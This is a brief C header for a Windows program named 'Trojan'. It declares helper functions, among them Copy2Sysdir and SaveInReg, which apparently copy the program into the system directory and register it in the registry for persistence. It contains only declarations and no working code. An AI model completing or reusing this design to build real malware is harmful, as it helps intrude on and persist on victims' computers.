#pragma once

#ifndef __TOOLS_H_INCLUDED__
#define __TOOLS_H_INCLUDED__

#include <Windows.h>

#define APP_NAME TEXT("Trojan")
#define SMALL_BUFFER_LENGTH 256

BOOL FileExist(CONST PTCHAR filename);
BOOL Copy2Sysdir(CONST PTCHAR appname);
BOOL SaveInReg(CONST PTCHAR appname);

VOID PrintError(CONST PTCHAR msg, INT error);
VOID ClearConsole();

#endif /* __TOOLS_H_INCLUDED__ */